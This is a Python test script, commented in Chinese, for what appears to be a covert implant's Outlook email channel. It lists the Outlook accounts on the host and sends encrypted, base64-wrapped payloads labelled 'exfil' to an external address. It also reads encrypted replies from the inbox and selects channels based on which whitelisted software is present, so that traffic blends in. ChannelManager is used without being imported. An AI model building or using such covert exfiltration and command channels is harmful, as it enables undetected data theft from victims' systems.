"""
Outlook COM 通道独立测试脚本
测试内容：COM 初始化 → 发送加密邮件 → 接收邮件解密
用法：python test_outlook_channel.py <接收邮箱地址>
"""
import sys
import os
import time
import base64
import json

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from shared.crypto import CryptoEngine, serialize_message, deserialize_message
from agent.comm_channels import OutlookChannel


def test_com_init():
    """测试 1: Outlook COM 对象能否正常创建"""
    print("=" * 50)
    print("[测试1] Outlook COM 对象初始化")
    print("=" * 50)
    try:
        import win32com.client
        outlook = win32com.client.Dispatch("Outlook.Application")
        ns = outlook.GetNamespace("MAPI")
        # 尝试获取收件箱验证邮箱已配置
        inbox = ns.GetDefaultFolder(6)
        account_count = outlook.Session.Accounts.Count
        print(f"  [OK] COM 对象创建成功")
        print(f"  [OK] 收件箱路径: {inbox.FolderPath}")
        print(f"  [OK] 已配置账户数: {account_count}")
        # 列出账户
        for i in range(1, account_count + 1):
            acct = outlook.Session.Accounts.Item(i)
            print(f"       账户 {i}: {acct.SmtpAddress}")
        return True
    except ImportError:
        print("  [FAIL] pywin32 未安装，请运行: pip install pywin32")
        return False
    except Exception as e:
        print(f"  [FAIL] COM 初始化失败: {e}")
        return False


def test_send_email(target_email: str):
    """测试 2: 通过 Outlook 通道发送加密邮件"""
    print("\n" + "=" * 50)
    print("[测试2] 发送加密邮件")
    print("=" * 50)

    crypto = CryptoEngine()
    session_id = "test-session-001"

    channel = OutlookChannel(crypto, session_id)
    if not channel.connect(target_email=target_email):
        print("  [FAIL] Outlook 通道连接失败")
        return False

    print(f"  [OK] 通道已连接，目标邮箱: {target_email}")

    # 发送测试数据
    test_data = b"Hello from Outlook channel test! " + str(int(time.time())).encode()
    print(f"  [*] 发送数据: {test_data.decode()}")

    success = channel.send(test_data, msg_type="result")
    if success:
        print("  [OK] 邮件发送成功")
    else:
        print("  [FAIL] 邮件发送失败")

    channel.close()
    return success


def test_recv_email():
    """测试 3: 从收件箱读取未读邮件"""
    print("\n" + "=" * 50)
    print("[测试3] 接收并解析收件箱未读邮件")
    print("=" * 50)

    crypto = CryptoEngine()
    session_id = "test-session-001"

    channel = OutlookChannel(crypto, session_id)
    if not channel.connect(target_email=""):
        print("  [FAIL] Outlook 通道连接失败")
        return False

    print("  [*] 扫描收件箱未读邮件...")
    result = channel.recv()
    if result:
        print(f"  [OK] 收到数据: {result}")
    else:
        print("  [INFO] 没有找到可解析的未读邮件（这是正常的，如果没有其他端发送加密邮件）")

    channel.close()
    return True


def test_encrypt_decrypt_roundtrip():
    """测试 4: 加密 → base64 → 解密 完整往返"""
    print("\n" + "=" * 50)
    print("[测试4] 加解密往返测试（不依赖邮件收发）")
    print("=" * 50)

    crypto = CryptoEngine()
    session_id = "test-roundtrip"

    # 模拟 send 中的加密流程
    test_data = b"Roundtrip test payload " + os.urandom(64)
    print(f"  [*] 原始数据长度: {len(test_data)} 字节")

    # 加密
    msg = crypto.encrypt_message(test_data, session_id, channel="outlook", msg_type="exfil")
    wire = serialize_message(msg)
    encoded = base64.b64encode(wire).decode("ascii")
    print(f"  [OK] 加密 + 序列化 + base64 完成，长度: {len(encoded)} 字符")

    # 解密（模拟 recv 流程）
    wire_back = base64.b64decode(encoded)
    from shared.crypto import deserialize_message as dm
    msg_back, _ = dm(wire_back)
    result = crypto.decrypt_message(msg_back)
    print(f"  [OK] 解密完成，数据长度: {len(result)} 字节")

    if result == test_data:
        print("  [OK] 数据一致性验证通过!")
        return True
    else:
        print("  [FAIL] 数据不一致!")
        return False


def test_channel_manager_outlook():
    """测试 5: 通过 ChannelManager 自动选择 Outlook 通道"""
    print("\n" + "=" * 50)
    print("[测试5] ChannelManager 通道选择（Outlook 优先级）")
    print("=" * 50)

    from agent.env_perception import EnvProfile

    # 构造一个有 Outlook 的环境画像
    profile = EnvProfile()
    profile.whitelist_software = ["Outlook", "Chrome"]
    print(f"  [*] 环境画像: has_outlook() = {profile.has_outlook()}")

    crypto = CryptoEngine()
    mgr = ChannelManager(crypto, "test-mgr")

    selected = mgr.select_channels(profile)
    print(f"  [OK] 选择的通道列表: {selected}")

    if "outlook" in selected:
        print("  [OK] Outlook 通道在优先级列表中")
    else:
        print("  [FAIL] Outlook 通道未被选中")

    return "outlook" in selected


def main():
    if len(sys.argv) < 2:
        print("用法: python test_outlook_channel.py <接收邮箱地址>")
        print("示例: python test_outlook_channel.py test@example.com")
        print("\n如果只测试本地功能（不发邮件），输入 'local'")
        email = input("请输入接收邮箱 (或输入 local): ").strip()
        if not email:
            email = "local"
    else:
        email = sys.argv[1]

    results = {}

    # 测试1: COM 初始化（必须通过）
    results["COM 初始化"] = test_com_init()

    # 测试4: 加解密往返（纯本地，不需要邮件）
    results["加解密往返"] = test_encrypt_decrypt_roundtrip()

    # 测试5: 通道选择（纯本地）
    results["通道选择"] = test_channel_manager_outlook()

    if email != "local" and "@" in email:
        # 测试2: 发送邮件
        results["发送邮件"] = test_send_email(email)

        # 等待一下让邮件送达
        if results["发送邮件"]:
            print("\n  [*] 等待 5 秒让邮件送达...")
            time.sleep(5)

        # 测试3: 接收邮件
        results["接收邮件"] = test_recv_email()
    else:
        print("\n  [跳过] 邮件收发测试（未提供邮箱地址）")

    # 汇总
    print("\n" + "=" * 50)
    print("测试结果汇总")
    print("=" * 50)
    for name, passed in results.items():
        status = "PASS" if passed else "FAIL"
        print(f"  [{status}] {name}")

    total = len(results)
    passed = sum(1 for v in results.values() if v)
    print(f"\n  总计: {passed}/{total} 通过")


if __name__ == "__main__":
    main()
